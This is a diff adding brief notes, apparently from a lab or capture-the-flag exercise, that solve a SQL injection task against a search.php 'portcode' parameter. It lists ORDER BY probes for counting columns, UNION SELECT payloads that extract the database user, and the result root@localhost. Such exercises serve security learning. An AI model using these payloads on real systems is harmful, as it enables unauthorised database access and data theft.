@@ -1,0 +1,16 @@
+Use a Union injection to get the result of 'user()'
+
+web ---> (target) 
+
+search
+
+search.php?portcode=cn' ORDER BY 1-- -
+search.php?portcode=cn' ORDER BY 2-- -
+search.php?portcode=cn' ORDER BY 3-- -
+search.php?portcode=cn' ORDER BY 4-- -
+search.php?portcode=cn' ORDER BY 5-- -
+
+search.php?portcode=cn' UNION select 1,2,3,4-- -
+search.php?portcode=cn' UNION select 1,user(),3,4-- -
+
+root@localhost
